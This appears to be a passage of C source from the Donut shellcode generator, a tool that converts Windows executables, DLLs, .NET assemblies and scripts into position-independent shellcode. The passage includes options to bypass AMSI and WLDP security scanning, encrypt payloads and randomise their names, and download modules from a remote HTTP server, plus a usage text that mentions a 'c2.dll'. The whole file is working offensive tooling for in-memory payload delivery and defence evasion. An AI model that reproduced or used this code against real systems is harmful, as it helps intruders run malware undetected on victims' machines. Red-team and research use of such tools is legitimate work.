    strcpy(inst->kernelbase,     "kernelbase");
    
    // ansi and unicode symbols to patch for unmanaged EXE command line
    strcpy(inst->cmd_syms,       "_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv");
    
    // exit-related API to replace with RtlExitUserThread
    strcpy(inst->exit_api,       "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit");

    // required to disable WLDP
    strcpy(inst->wldp,           "wldp");
    strcpy(inst->wldpQuery,      "WldpQueryDynamicCodeTrust");
    strcpy(inst->wldpIsApproved, "WldpIsClassInApprovedList");

    // set the type of instance we're creating
    inst->type     = c->inst_type;
    // indicate if we should call RtlExitUserProcess to terminate host process
    inst->exit_opt = c->exit_opt;
    // set the OEP
    inst->oep      = c->oep;
    // set the entropy level
    inst->entropy  = c->entropy;
    // set the bypass level
    inst->bypass   = c->bypass;
    
    // if the module will be downloaded
    // set the URL parameter and request verb
    if(inst->type == DONUT_INSTANCE_HTTP) {
      if(c->entropy != DONUT_ENTROPY_NONE) {
        // if no module name specified
        if(c->modname[0] == 0) {
          // generate a random name for module
          // that will be saved to disk
          if(!GenRandomString(c->modname, DONUT_MAX_MODNAME)) {
            return DONUT_ERROR_RANDOM;
          }
          DPRINT("Generated random name for module : %s", c->modname);
        }
      } else {
        // set to "AAAAAAAA"
        memset(c->modname, 'A', DONUT_MAX_MODNAME);
      }
      DPRINT("Setting URL parameters");
      strcpy(inst->server, c->server);
      // append module name
      strcat(inst->server, c->modname);
      // set the request verb
      strcpy(inst->http_req, "GET");
      
      DPRINT("Payload will attempt download from : %s", inst->server);
    }

    inst->mod_len = c->mod_len;
    inst->len     = inst_len;
    c->inst       = inst;
    c->inst_len   = inst_len;
    
    if(c->inst_type == DONUT_INSTANCE_HTTP && 
       c->entropy == DONUT_ENTROPY_DEFAULT) 
    {
      DPRINT("encrypting module for download");
      
      c->mod->mac = maru(inst->sig, inst->iv);
      
      donut_encrypt(
        mod_key.mk, 
        mod_key.ctr, 
        c->mod, 
        c->mod_len);
    }
    // if embedded, copy module to instance
    if(inst->type == DONUT_INSTANCE_EMBED) {
      DPRINT("Copying module data to instance");
      memcpy(&c->inst->module.x, c->mod, c->mod_len);
    }
    
    if(c->entropy == DONUT_ENTROPY_DEFAULT) {
      DPRINT("encrypting instance");
      
      inst->mac = maru(inst->sig, inst->iv);
      
      uint8_t *inst_data = (uint8_t*)inst + offsetof(DONUT_INSTANCE, api_cnt);
      
      donut_encrypt(
        inst_key.mk, 
        inst_key.ctr, 
        inst_data, 
        c->inst_len - offsetof(DONUT_INSTANCE, api_cnt));
    }
    DPRINT("Leaving.");
    
    return DONUT_ERROR_SUCCESS;
}
  
// given a configuration, create a position-independent code that will run from anywhere in memory
EXPORT_FUNC 
int DonutCreate(PDONUT_CONFIG c) {
    uint8_t   *pl;
    uint32_t  t;
    int       url_len, err = DONUT_ERROR_SUCCESS;
    FILE      *fd;
    file_info fi;
    
    DPRINT("Entering.");
    
    DPRINT("Validating configuration and path of file PDONUT_CONFIG: %p", c);
    
    if(c == NULL || c->input[0] == 0) {
      return DONUT_ERROR_INVALID_PARAMETER;
    }
    
    c->mod      = NULL;
    c->mod_len  = 0;
    
    c->inst     = NULL;
    c->inst_len = 0;
    
    c->pic      = NULL;
    c->pic_len  = 0;
    
    // instance not specified?
    DPRINT("Validating instance type %" PRIx32 "", c->inst_type);
    
    if(c->inst_type != DONUT_INSTANCE_EMBED &&
       c->inst_type != DONUT_INSTANCE_HTTP) {
         
      return DONUT_ERROR_INVALID_PARAMETER;
    }
    
    DPRINT("Validating format");
    if(c->format < DONUT_FORMAT_BINARY || c->format > DONUT_FORMAT_HEX){
      return DONUT_ERROR_INVALID_FORMAT;
    }
    
    DPRINT("Validating compression");
    #ifdef WINDOWS
      if(c->compress != DONUT_COMPRESS_NONE        &&
         c->compress != DONUT_COMPRESS_APLIB       &&
         c->compress != DONUT_COMPRESS_LZNT1       &&
         c->compress != DONUT_COMPRESS_XPRESS      &&
         c->compress != DONUT_COMPRESS_XPRESS_HUFF)
      {
        return DONUT_ERROR_INVALID_ENGINE;
      }
    #else
      if(c->compress != DONUT_COMPRESS_NONE        &&
         c->compress != DONUT_COMPRESS_APLIB)
      {
        return DONUT_ERROR_INVALID_ENGINE;
      }
    #endif
  
    DPRINT("Validating entropy level");
    if(c->entropy != DONUT_ENTROPY_NONE   &&
       c->entropy != DONUT_ENTROPY_RANDOM &&
       c->entropy != DONUT_ENTROPY_DEFAULT)
    {
      return DONUT_ERROR_INVALID_ENTROPY;
    }
    
    if(c->inst_type == DONUT_INSTANCE_HTTP) {
      DPRINT("Validating URL");
      
      // no URL? exit
      if(c->server[0] == 0) {
        return DONUT_ERROR_INVALID_PARAMETER;
      }
      // doesn't begin with one of the following? exit
      if((strnicmp(c->server, "http://",  7) != 0) &&
         (strnicmp(c->server, "https://", 8) != 0)) {
           
        return DONUT_ERROR_INVALID_URL;
      }
      // invalid length?
      if(strlen(c->server) <= 8) {
        return DONUT_ERROR_URL_LENGTH;
      }
      // ensure URL parameter and module name don't exceed DONUT_MAX_NAME
      url_len = strlen(c->server);
      
      // if the end of string doesn't have a forward slash
      // add one more to account for it
      if(c->server[url_len - 1] != '/') {
        strcat(c->server, "/");
        url_len++;
      }
      
      if((url_len + DONUT_MAX_MODNAME) >= DONUT_MAX_NAME) {
        return DONUT_ERROR_URL_LENGTH;
      }
    }
    
    DPRINT("Validating architecture");
    
    if(c->arch != DONUT_ARCH_X86 &&
       c->arch != DONUT_ARCH_X64 &&
       c->arch != DONUT_ARCH_X84 &&
       c->arch != DONUT_ARCH_ANY)
    {
      return DONUT_ERROR_INVALID_ARCH;
    }
    
    DPRINT("Validating AMSI/WDLP bypass option");
    
    if(c->bypass != DONUT_BYPASS_NONE     &&
       c->bypass != DONUT_BYPASS_ABORT    &&
       c->bypass != DONUT_BYPASS_CONTINUE)
    {
      return DONUT_ERROR_BYPASS_INVALID;
    }
    
    // get file information
    err = get_file_info(c, &fi);
    if(err != DONUT_ERROR_SUCCESS) return err;
    
    // Set the module type
    c->mod_type = fi.type;
    
    // Unmanaged EXE/DLL?
    if(c->mod_type == DONUT_MODULE_DLL ||
       c->mod_type == DONUT_MODULE_EXE)
    {
      DPRINT("Validating architecture %i for DLL/EXE %i",
        c->arch, fi.arch);
      // Requested shellcode is x86, but file is x64?
      // Requested shellcode is x64, but file is x86?
      if((c->arch == DONUT_ARCH_X86  && 
         fi.arch  == DONUT_ARCH_X64) ||
         (c->arch == DONUT_ARCH_X64  &&
         fi.arch  == DONUT_ARCH_X86))
      {
        err = DONUT_ERROR_ARCH_MISMATCH;
        goto cleanup;
      }
      // DLL function specified. Does it exist?
      if(c->mod_type == DONUT_MODULE_DLL && c->method[0] != 0)
      {
        DPRINT("Validating DLL function \"%s\" for DLL", c->method);
        if(!is_dll_export(&fi, c->method)) {
          err = DONUT_ERROR_DLL_FUNCTION;
          goto cleanup;
        }
      }
    }    
    // .NET DLL assembly?
    if(c->mod_type == DONUT_MODULE_NET_DLL) {
      // DLL requires class and method
      if(c->cls[0] == 0 || c->method[0] == 0) {
        err = DONUT_ERROR_NET_PARAMS;
        goto cleanup;
      }
    }
    
    // is this an unmanaged DLL with parameters?
    if(c->mod_type == DONUT_MODULE_DLL && c->param[0] != 0)
    {
      // we need a DLL function
      if(c->method[0] == 0) {
        err = DONUT_ERROR_DLL_PARAM;
        goto cleanup;
      }
    }
    // 1. Create the module
    DPRINT("Creating module");
    err = CreateModule(c, &fi);
    
    if(err != DONUT_ERROR_SUCCESS) 
      goto cleanup;

    // 2. Create the instance
    DPRINT("Creating instance");
    err = CreateInstance(c, &fi);
    
    if(err != DONUT_ERROR_SUCCESS)
      goto cleanup;
    
    // if DEBUG is defined, save instance to disk
    #ifdef DEBUG
      DPRINT("Saving instance to file");
      fd = fopen("instance", "wb");
      
      if(fd != NULL) {
        fwrite(c->inst, 1, c->inst_len, fd);
        fclose(fd);
      }
    #endif
    // 3. If the module will be stored on a remote server
    if(c->inst_type == DONUT_INSTANCE_HTTP) {
      DPRINT("Saving %s to disk.", c->modname);
      // save the module to disk using random name
      fd = fopen(c->modname, "wb");
      
      if(fd != NULL) {
        fwrite(c->mod, 1, c->mod_len, fd);
        fclose(fd);
      }
    }
    // 4. calculate size of shellcode + instance combined
    if(c->arch == DONUT_ARCH_X86) {
      c->pic_len = sizeof(LOADER_EXE_X86) + c->inst_len + 32;
    } else 
    if(c->arch == DONUT_ARCH_X64) {
      c->pic_len = sizeof(LOADER_EXE_X64) + c->inst_len + 32;
    } else 
    if(c->arch == DONUT_ARCH_X84) {
      c->pic_len = sizeof(LOADER_EXE_X86) + 
                   sizeof(LOADER_EXE_X64) + c->inst_len + 32;
    }
    // 5. allocate memory for shellcode
    c->pic = malloc(c->pic_len);
    
    DPRINT("PIC size : %" PRIi32, c->pic_len);
    
    if(c->pic == NULL) {
      err = DONUT_ERROR_NO_MEMORY;
      goto cleanup;
    }
    
    DPRINT("Inserting opcodes");
    // 6. insert shellcode
    pl = (uint8_t*)c->pic;
    // call $ + c->inst_len
    PUT_BYTE(pl,  0xE8);
    PUT_WORD(pl,  c->inst_len);
    PUT_BYTES(pl, c->inst, c->inst_len);
    // pop ecx
    PUT_BYTE(pl,  0x59);
    
    // x86?
    if(c->arch == DONUT_ARCH_X86) {
      // pop edx
      PUT_BYTE(pl, 0x5A);
      // push ecx
      PUT_BYTE(pl, 0x51);
      // push edx
      PUT_BYTE(pl, 0x52);
      
      DPRINT("Copying %" PRIi64 " bytes of x86 shellcode", 
        (uint64_t)sizeof(LOADER_EXE_X86));
        
      PUT_BYTES(pl, LOADER_EXE_X86, sizeof(LOADER_EXE_X86));
    } else 
    // AMD64?
    if(c->arch == DONUT_ARCH_X64) {
      
      DPRINT("Copying %" PRIi64 " bytes of amd64 shellcode", 
        (uint64_t)sizeof(LOADER_EXE_X64));
        
      PUT_BYTES(pl, LOADER_EXE_X64, sizeof(LOADER_EXE_X64));
    } else 
    // x86 + AMD64?
    if(c->arch == DONUT_ARCH_X84) {
      
      DPRINT("Copying %" PRIi64 " bytes of x86 + amd64 shellcode",
        (uint64_t)(sizeof(LOADER_EXE_X86) + sizeof(LOADER_EXE_X64)));
        
      // xor eax, eax
      PUT_BYTE(pl, 0x31);
      PUT_BYTE(pl, 0xC0);
      // dec eax
      PUT_BYTE(pl, 0x48);
      // js dword x86_code
      PUT_BYTE(pl, 0x0F);
      PUT_BYTE(pl, 0x88);
      PUT_WORD(pl,  sizeof(LOADER_EXE_X64));
      PUT_BYTES(pl, LOADER_EXE_X64, sizeof(LOADER_EXE_X64));
      // pop edx
      PUT_BYTE(pl, 0x5A);
      // push ecx
      PUT_BYTE(pl, 0x51);
      // push edx
      PUT_BYTE(pl, 0x52);
      PUT_BYTES(pl, LOADER_EXE_X86, sizeof(LOADER_EXE_X86));
    }
    
    // no output file specified?
    if(c->output[0] == 0) {
      // set to default name based on format
      switch(c->format) {
        case DONUT_FORMAT_BINARY:
          strncpy(c->output, "loader.bin", DONUT_MAX_NAME-1);
          break;
        case DONUT_FORMAT_BASE64:
          strncpy(c->output, "loader.b64", DONUT_MAX_NAME-1);
          break;
        case DONUT_FORMAT_RUBY:
          strncpy(c->output, "loader.rb",  DONUT_MAX_NAME-1);
          break;
        case DONUT_FORMAT_C:
          strncpy(c->output, "loader.c",   DONUT_MAX_NAME-1);
          break;
        case DONUT_FORMAT_PYTHON:
          strncpy(c->output, "loader.py",  DONUT_MAX_NAME-1);
          break;
        case DONUT_FORMAT_POWERSHELL:
          strncpy(c->output, "loader.ps1", DONUT_MAX_NAME-1);
          break;
        case DONUT_FORMAT_CSHARP:
          strncpy(c->output, "loader.cs",  DONUT_MAX_NAME-1);
          break;
        case DONUT_FORMAT_HEX:
          strncpy(c->output, "loader.hex", DONUT_MAX_NAME-1);
          break;
      }
    }
    // save loader to file
    fd = fopen(c->output, "wb");
    if(fd == NULL) {
      err = DONUT_ERROR_FILE_ACCESS;
      goto cleanup;
    }
    
    switch(c->format) {
      case DONUT_FORMAT_BINARY: {
        DPRINT("Saving loader as raw data");
        fwrite(c->pic, 1, c->pic_len, fd);
        err = DONUT_ERROR_SUCCESS;
        break;
      }
      case DONUT_FORMAT_BASE64: {
        DPRINT("Saving loader as base64 string");
        err = base64_template(c->pic, c->pic_len, fd);
        break;
      }
      case DONUT_FORMAT_RUBY:
      case DONUT_FORMAT_C:
        DPRINT("Saving loader as C/Ruby string");
        err = c_ruby_template(c->pic, c->pic_len, fd);
        break;
      case DONUT_FORMAT_PYTHON:
        DPRINT("Saving loader as Python string");
        err = py_template(c->pic, c->pic_len, fd);
        break;
      case DONUT_FORMAT_POWERSHELL:
        DPRINT("Saving loader as Powershell string");
        err = powershell_template(c->pic, c->pic_len, fd);
        break;
      case DONUT_FORMAT_CSHARP:
        DPRINT("Saving loader as C# string");
        err = csharp_template(c->pic, c->pic_len, fd);
        break;
      case DONUT_FORMAT_HEX:
        DPRINT("Saving loader as Hex string");
        err = hex_template(c->pic, c->pic_len, fd);
        break;
    }
    fclose(fd);
cleanup:
    // if there was some error, release resources
    if(err != DONUT_ERROR_SUCCESS) {
      DonutDelete(c);
    }
    unmap_file(&fi);
    DPRINT("Leaving.");
    return err;
}

// release resources allocated for configuration
EXPORT_FUNC 
int DonutDelete(PDONUT_CONFIG c) {
    
    DPRINT("Entering.");
    if(c == NULL) {
      return DONUT_ERROR_INVALID_PARAMETER;
    }
    // free module
    if(c->mod != NULL) {
      free(c->mod);
      c->mod = NULL;
    }
    // free instance
    if(c->inst != NULL) {
      free(c->inst);
      c->inst = NULL;
    }
    // free loader
    if(c->pic != NULL) {
      free(c->pic);
      c->pic = NULL;
    }
    DPRINT("Leaving.");
    return DONUT_ERROR_SUCCESS;
}

EXPORT_FUNC
const char *DonutError(int err) {
    static const char *str="N/A";
    
    switch(err) {
      case DONUT_ERROR_SUCCESS:
        str = "No error";
        break;
      case DONUT_ERROR_FILE_NOT_FOUND:
        str = "File not found";
        break;
      case DONUT_ERROR_FILE_EMPTY:
        str = "File is empty";
        break;
      case DONUT_ERROR_FILE_ACCESS:
        str = "Cannot open file";
        break;
      case DONUT_ERROR_FILE_INVALID:
        str = "File is invalid";
        break;      
      case DONUT_ERROR_NET_PARAMS:
        str = "File is a .NET DLL. Donut requires a class and method";
        break;
      case DONUT_ERROR_NO_MEMORY:
        str = "No memory available";
        break;
      case DONUT_ERROR_INVALID_ARCH:
        str = "Invalid architecture specified";
        break;      
      case DONUT_ERROR_INVALID_URL:
        str = "Invalid URL";
        break;
      case DONUT_ERROR_URL_LENGTH:
        str = "Invalid URL length";
        break;
      case DONUT_ERROR_INVALID_PARAMETER:
        str = "Invalid parameter";
        break;
      case DONUT_ERROR_RANDOM:
        str = "Error generating random values";
        break;
      case DONUT_ERROR_DLL_FUNCTION:
        str = "Unable to locate DLL function provided. Names are case sensitive";
        break;
      case DONUT_ERROR_ARCH_MISMATCH:
        str = "Target architecture cannot support selected DLL/EXE file";
        break;
      case DONUT_ERROR_DLL_PARAM:
        str = "You've supplied parameters for an unmanaged DLL. Donut also requires a DLL function";
        break;
      case DONUT_ERROR_BYPASS_INVALID:
        str = "Invalid bypass option specified";
        break;
      case DONUT_ERROR_NORELOC:
        str = "This file has no relocation information required for in-memory execution.";
        break;
      case DONUT_ERROR_INVALID_FORMAT:
        str = "The output format is invalid.";
        break;
      case DONUT_ERROR_INVALID_ENGINE:
        str = "The compression engine is invalid.";
        break;
      case DONUT_ERROR_COMPRESSION:
        str = "There was an error during compression.";
        break;
      case DONUT_ERROR_INVALID_ENTROPY:
        str = "Invalid entropy level specified.";
        break;
    }
    return str;
}

#ifdef DONUT_EXE
static char* get_param (int argc, char *argv[], int *i) {
    int n = *i;
    if (argv[n][2] != 0) {
      return &argv[n][2];
    }
    if ((n+1) < argc) {
      *i = n + 1;
      return argv[n+1];
    }
    printf("  [ %c%c requires parameter\n", argv[n][0], argv[n][1]);
    exit (0);
}


static void usage (void) {
    printf(" usage: donut [options] <EXE/DLL/VBS/JS>\n\n");
    printf("       Only the finest artisanal donuts are made of shells.\n\n");   
    printf("                   -MODULE OPTIONS-\n\n");
    printf("       -n <name>            Module name. Randomly generated by default with entropy enabled.\n");
    printf("       -s <server>          HTTP server that will host the donut module.\n");
    printf("       -e <level>           Entropy. 1=none, 2=use random names, 3=random names + symmetric encryption (default)\n\n");
    
    printf("                   -PIC/SHELLCODE OPTIONS-\n\n");    
    printf("       -a <arch>            Target architecture : 1=x86, 2=amd64, 3=x86+amd64(default).\n");
    printf("       -b <level>           Bypass AMSI/WLDP : 1=none, 2=abort on fail, 3=continue on fail.(default)\n");
    printf("       -o <path>            Output file to save loader. Default is \"loader.bin\"\n");
    printf("       -f <format>          Output format. 1=binary (default), 2=base64, 3=c, 4=ruby, 5=python, 6=powershell, 7=C#, 8=hex\n");
    printf("       -y <oep>             Create a new thread for loader. Optionally execute original entrypoint of host process.\n");
    printf("       -x <action>          Exiting. 1=exit thread (default), 2=exit process\n\n");

    printf("                   -FILE OPTIONS-\n\n");
    printf("       -c <namespace.class> Optional class name. (required for .NET DLL)\n");
    printf("       -d <name>            AppDomain name to create for .NET. Randomly generated by default with entropy enabled.\n");
    printf("       -m <method | api>    Optional method or function for DLL. (a method is required for .NET DLL)\n");
    printf("       -p <parameters>      Optional parameters/command line inside quotations for DLL method/function or EXE.\n");
    printf("       -w                   Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)\n");
    printf("       -r <version>         CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.\n");
    printf("       -t                   Create new thread for entrypoint of unmanaged EXE.\n");
#ifdef WINDOWS
    printf("       -z <engine>          Pack/Compress file. 1=none, 2=aPLib, 3=LZNT1, 4=Xpress, 5=Xpress Huffman\n\n");
#else
    printf("       -z <engine>          Pack/Compress file. 1=none, 2=aPLib\n\n");
#endif

    printf(" examples:\n\n");
    printf("    donut c2.dll\n");
    printf("    donut -a1 -cTestClass -mRunProcess -pnotepad.exe loader.dll\n");
    printf("    donut loader.dll -c TestClass -m RunProcess -p\"calc notepad\" -s http://remote_server.com/modules/\n");
    
    exit (0);
}

int main(int argc, char *argv[]) {
    DONUT_CONFIG c;
    char         opt;
    int          i, err;
    char         *mod_type;
    char         *arch_str[3] = { "x86", "amd64", "x86+amd64" };
    char         *inst_type[3]= { "Embedded", "HTTP", "DNS" };
    
    printf("\n");
    printf("  [ Donut shellcode generator v0.9.3\n");
    printf("  [ Copyright (c) 2019 TheWover, Odzhan\n\n");
    
    // zero initialize configuration
    memset(&c, 0, sizeof(c));
    
    // default settings
    c.inst_type = DONUT_INSTANCE_EMBED;   // file is embedded
    c.arch      = DONUT_ARCH_X84;         // dual-mode (x86+amd64)
    c.bypass    = DONUT_BYPASS_CONTINUE;  // continues loading even if disabling AMSI/WLDP fails
    c.format    = DONUT_FORMAT_BINARY;    // default output format
    c.compress  = DONUT_COMPRESS_NONE;    // compression is disabled by default
    c.entropy   = DONUT_ENTROPY_DEFAULT;  // enable random names + symmetric encryption by default
    c.exit_opt  = DONUT_OPT_EXIT_THREAD;  // default behaviour is to exit the thread
    c.unicode   = 0;                      // command line will not be converted to unicode for unmanaged DLL function
    
    // parse arguments
    for(i=1; i<argc; i++) {
      // switch?
      if(argv[i][0] == '-') {
        opt = argv[i][1];
        
        switch(opt) {
          // target cpu architecture
          case 'a': {
            c.arch = atoi(get_param(argc, argv, &i));
            break;
          }
          // bypass options
          case 'b': {
            c.bypass = atoi(get_param(argc, argv, &i));
            break;
          }
          // class of .NET assembly
          case 'c': {
            strncpy(c.cls, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
            break;
          }
          // name of domain to use for .NET assembly
          case 'd': {
            strncpy(c.domain, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
            break;
          }
          // encryption options
          case 'e': {
            c.entropy = atoi(get_param(argc, argv, &i));
            break;
          }
          // output format
          case 'f': {
            c.format = atoi(get_param(argc, argv, &i));
            break;
          }
          // method of .NET assembly
          case 'm': {
            strncpy(c.method, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
            break;
          }
          // module name
          case 'n': {
            strncpy(c.modname, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
            break;
          }
          // output file for loader
          case 'o': {
            strncpy(c.output, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
            break;
          }
          // parameters to method, DLL function or command line for unmanaged EXE
          case 'p': {
            strncpy(c.param, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
            break;
          }
          // runtime version to use for .NET DLL / EXE
          case 'r': {
            strncpy(c.runtime, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
            break;
          }
          // run entrypoint of unmanaged EXE as a thread
          case 't': {
            c.thread = 1;
            break;
          }
          // server
          case 's': {
            strncpy(c.server, get_param(argc, argv, &i), DONUT_MAX_NAME - 2);
            c.inst_type = DONUT_INSTANCE_HTTP;
            break;
          }
          // convert param to unicode? only applies to unmanaged DLL function
          case 'w': {
            c.unicode = 1;
            break;
          }
          // call RtlExitUserProcess to terminate host process
          case 'x': {
            c.exit_opt = atoi(get_param(argc, argv, &i)); 
            break;
          }
          // fork a new thread and execute address of original entry point
          case 'y': {
            c.oep = strtoull(get_param(argc, argv, &i), NULL, 16);
            break;
          }
          // pack/compress input file
          case 'z': {
            c.compress = atoi(get_param(argc, argv, &i));
            break;
          }
          // for anything else, display usage
          default: {
            usage();
            break;
          }
        }
      } else {
        // assume it's an EXE/DLL/VBS/JS file to embed in shellcode
        strncpy(c.input, argv[i], DONUT_MAX_NAME - 1);
      }
    }
    
    // no file? show usage and exit
    if(c.input[0] == 0) {
      usage();
    }
    
    // generate loader from configuration
    err = DonutCreate(&c);

    if(err != DONUT_ERROR_SUCCESS) {
      printf("  [ Error : %s\n", DonutError(err));
      return 0;
    }
    
    switch(c.mod_type) {
      case DONUT_MODULE_DLL:
        mod_type = "DLL";
        break;
      case DONUT_MODULE_EXE:
        mod_type = "EXE";
        break;
      case DONUT_MODULE_NET_DLL:
        mod_type = ".NET DLL";
        break;
      case DONUT_MODULE_NET_EXE:
        mod_type = ".NET EXE";
        break;
      case DONUT_MODULE_VBS:
        mod_type = "VBScript";
        break;
      case DONUT_MODULE_JS:
        mod_type = "JScript";
        break;
      default:
        mod_type = "Unrecognized";
        break;
    }
    
    printf("  [ Instance type : %s\n",     inst_type[c.inst_type - 1]);
    printf("  [ Module file   : \"%s\"\n", c.input);
    printf("  [ Entropy       : %s\n", 
      c.entropy == DONUT_ENTROPY_NONE   ? "None" :
      c.entropy == DONUT_ENTROPY_RANDOM ? "Random Names" : "Random names + Encryption");      
    
    if(c.compress != DONUT_COMPRESS_NONE) {
      printf("  [ Compressed    : %s (Reduced by %"PRId32"%%)\n",
        c.compress == DONUT_COMPRESS_APLIB  ? "aPLib" :
        c.compress == DONUT_COMPRESS_LZNT1  ? "LZNT1" :
        c.compress == DONUT_COMPRESS_XPRESS ? "Xpress" : "Xpress Huffman",
        file_diff(c.zlen, c.len));
    }
    
    printf("  [ File type     : %s\n",     mod_type);
    
    // if this is a .NET DLL, display the class and method
    if(c.mod_type == DONUT_MODULE_NET_DLL) {
      printf("  [ Class         : %s\n", c.cls   );
      printf("  [ Method        : %s\n", c.method);
    } else
    if(c.mod_type == DONUT_MODULE_DLL) {
      printf("  [ Function      : %s\n", 
        c.method[0] != 0 ? c.method : "DllMain");
    }
    // if parameters supplied, display them
    if(c.param[0] != 0) {
      printf("  [ Parameters    : %s\n", c.param);
    }
    printf("  [ Target CPU    : %s\n", arch_str[c.arch - 1]);
    
    if(c.inst_type == DONUT_INSTANCE_HTTP) {
      printf("  [ Module name   : %s\n", c.modname);
      printf("  [ Upload to     : %s\n", c.server);
    }
    
    printf("  [ AMSI/WDLP     : %s\n",
      c.bypass == DONUT_BYPASS_NONE  ? "none" : 
      c.bypass == DONUT_BYPASS_ABORT ? "abort" : "continue"); 
    
    printf("  [ Shellcode     : \"%s\"\n", c.output);
    if(c.oep != 0) {
      printf("  [ OEP           : 0x%"PRIX64"\n", c.oep);
    }
    
    DonutDelete(&c);
    return 0;
}
#endif
